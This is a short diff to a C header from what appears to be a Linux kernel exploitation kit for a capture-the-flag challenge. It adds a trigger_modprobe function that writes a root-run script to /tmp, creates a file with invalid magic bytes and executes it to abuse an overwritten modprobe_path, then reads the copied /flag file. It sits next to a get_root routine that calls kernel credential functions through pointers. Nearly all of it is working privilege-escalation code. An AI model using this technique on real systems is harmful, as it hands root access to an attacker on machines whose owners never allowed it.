@@ -86,4 +86,22 @@ void get_root(u64 pkc, u64 cc) {
     (* (int * (*)(void *))cc)((* (void *(*)(void *))pkc)(NULL));
     restore_state();
 }
+
+void trigger_modprobe(){
+    act("try to trigger modprobe");
+
+    system(
+      "echo '#!/bin/sh\n"
+      "cp /flag /tmp/flag\n"
+      "chmod 777 /tmp/flag' > /tmp/s\n"
+    );
+    system("chmod +x /tmp/s");
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+
+    act("try to run unknown file");
+    system("/tmp/dummy");
+    system("cat /tmp/flag");
+    exit(0);
+}
 #endif /* __SNIPPET_H__ */
